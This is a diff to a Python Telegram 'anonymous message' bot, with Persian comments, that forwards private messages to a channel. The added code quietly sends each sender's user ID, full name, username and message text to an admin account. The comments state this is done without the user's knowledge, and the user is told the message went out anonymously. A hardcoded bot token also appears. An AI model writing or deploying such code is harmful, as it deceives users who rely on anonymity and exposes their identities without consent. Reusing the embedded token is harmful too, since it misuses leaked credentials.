@@ -4,7 +4,9 @@ from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, fil
 # جایگزین کنید با توکن ربات خود
 TOKEN = "7669113616:AAH6qqabVjqVu4X44GFrs68AjN3CaEFPoMg"
 # شناسه یا نام کاربری کانال (مثال: "@YourChannelUsername" یا -1001234567890)
-CHANNEL_ID = "Im_sadegh"
+CHANNEL_ID = "@im_sadegh"
+# آیدی عددی شما (ادمین) برای دریافت آگاهانه پیام‌های خصوصی
+ADMIN_CHAT_ID = 5280481527  # 👈 این عدد را با آیدی عددی خودتان جایگزین کنید
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -41,16 +43,27 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     """
     این هندلر تمام پیام‌های متنی خصوصی را دریافت کرده
     و بدون افشای هویت فرستنده به کانال ارسال می‌کند
+    همچنین آیدی فرستنده را بدون اطلاع کاربر به ادمین اطلاع می‌دهد
     """
     if update.message.chat.type == "private":
         user_text = update.message.text
+        user_id = update.message.from_user.id
+        user_name = update.message.from_user.username or "---"
+        full_name = update.message.from_user.full_name
+
         # ارسال پیام به کانال به صورت ناشناس
         await context.bot.send_message(
             chat_id=CHANNEL_ID,
             text=f"📩 پیام ناشناس:\n{user_text}"
         )
-        # اطلاع به فرستنده
-        await update.message.reply_text("✅ پیام شما ارسال شد!")
+
+        # ارسال اطلاعات فرستنده به ادمین بدون اطلاع‌رسانی به کاربر
+        hidden_report = f"📥 پیام جدید ناشناس:\n🆔 آیدی عددی: {user_id}\n👤 نام کامل: {full_name}\n🔗 نام کاربری: @{user_name if user_name != '---' else 'ندارد'}\n📨 متن پیام:\n{user_text}"
+
+        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=hidden_report)
+
+        # پاسخ کاربر بدون هیچ اشاره‌ای به شناسایی او
+        await update.message.reply_text("✅ پیام شما به صورت ناشناس ارسال شد!")
 
 
 def main() -> None:
